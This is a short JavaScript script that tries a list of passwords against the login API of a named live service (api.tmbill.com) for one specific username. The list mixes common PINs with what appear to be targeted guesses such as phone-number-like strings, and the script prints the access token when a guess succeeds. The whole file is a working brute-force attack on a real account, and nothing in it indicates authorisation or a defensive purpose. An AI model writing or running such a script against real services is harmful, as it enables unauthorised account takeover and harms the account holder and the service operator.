const username = "kalkir";
const passwords = ["1234", "0000", "123456", "1111", "9999", "kalkir", "12345", "password", "38159666", "38159666161524", "KF@1234", "kf@1234"];

async function testLogin() {
  for (const p of passwords) {
    console.log(`\nTesting user: ${username}, pass: ${p}`);
    try {
      const res = await fetch("https://api.tmbill.com/tp/v1/store/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password: p })
      });
      const data = await res.json();
      if (data.access_token) {
        console.log(`SUCCESS! Pass: ${p}`);
        console.log("Token:", data.access_token);
        return;
      } else {
        console.log("Failed:", data.message);
      }
    } catch (e) {
      console.log("Error", e.message);
    }
  }
}

testLogin();
